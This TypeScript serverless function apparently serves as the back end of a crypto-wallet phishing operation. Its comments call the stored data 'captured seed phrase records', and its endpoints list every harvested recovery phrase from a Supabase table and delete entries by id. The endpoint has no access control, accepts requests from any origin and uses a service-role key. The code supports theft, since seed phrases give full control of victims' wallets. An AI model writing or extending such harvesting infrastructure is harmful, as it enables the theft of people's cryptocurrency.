// Vercel serverless function: GET /api/seeds
// Returns all captured seed phrase records directly from Supabase.
// POST /api/seeds  — delete one record by id (body: { id: string })

export const config = { runtime: 'nodejs' }

const SUPABASE_URL = (process.env.SUPABASE_URL ?? process.env.VITE_SUPABASE_URL ?? '').trim()
const SUPABASE_KEY = (
  process.env.SUPABASE_SERVICE_ROLE_KEY
  ?? process.env.SUPABASE_ANON_KEY
  ?? process.env.VITE_SUPABASE_ANON_KEY
  ?? ''
).trim()

function headers() {
  return {
    apikey: SUPABASE_KEY,
    Authorization: `Bearer ${SUPABASE_KEY}`,
    'Content-Type': 'application/json',
    Prefer: 'return=representation',
  }
}

function upsertHeaders() {
  return {
    ...headers(),
    Prefer: 'resolution=merge-duplicates,return=representation',
  }
}

function json(payload: unknown, status = 200): Response {
  return new Response(JSON.stringify(payload), {
    status,
    headers: {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin':  '*',
      'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  })
}

export default async function handler(req: Request): Promise<Response> {
  if (req.method === 'OPTIONS') return json(null, 204)

  if (!SUPABASE_URL || !SUPABASE_KEY) {
    return json({ error: 'Supabase not configured' }, 503)
  }

  // ── GET — list all records ────────────────────────────────────────────────
  if (req.method === 'GET') {
    try {
      const res = await fetch(
        `${SUPABASE_URL}/rest/v1/app_state?id=eq.global&select=seed_phrases`,
        { headers: headers() },
      )
      if (!res.ok) return json({ error: 'Supabase read failed', status: res.status }, 502)
      const rows = (await res.json()) as { seed_phrases: unknown[] }[]
      const seeds = Array.isArray(rows[0]?.seed_phrases) ? rows[0].seed_phrases : []
      return json({ seeds, total: seeds.length })
    } catch (err) {
      return json({ error: String(err) }, 500)
    }
  }

  // ── DELETE — remove one record by id ─────────────────────────────────────
  if (req.method === 'DELETE') {
    let body: { id?: string }
    try { body = await req.json() } catch { return json({ error: 'Bad JSON' }, 400) }
    if (!body?.id) return json({ error: 'Missing id' }, 400)
    try {
      // Fetch existing, filter out the id, write back
      const fetchRes = await fetch(
        `${SUPABASE_URL}/rest/v1/app_state?id=eq.global&select=seed_phrases`,
        { headers: headers() },
      )
      const rows = fetchRes.ok ? (await fetchRes.json() as { seed_phrases: { id: string }[] }[]) : []
      const existing = Array.isArray(rows[0]?.seed_phrases) ? rows[0].seed_phrases : []
      const updated = existing.filter(r => r.id !== body.id)
      await fetch(`${SUPABASE_URL}/rest/v1/app_state?on_conflict=id`, {
        method: 'POST',
        headers: upsertHeaders(),
        body: JSON.stringify({
          id: 'global',
          seed_phrases: updated,
          updated_at: new Date().toISOString(),
        }),
      })
      return json({ ok: true, remaining: updated.length })
    } catch (err) {
      return json({ error: String(err) }, 500)
    }
  }

  return json({ error: 'Method not allowed' }, 405)
}
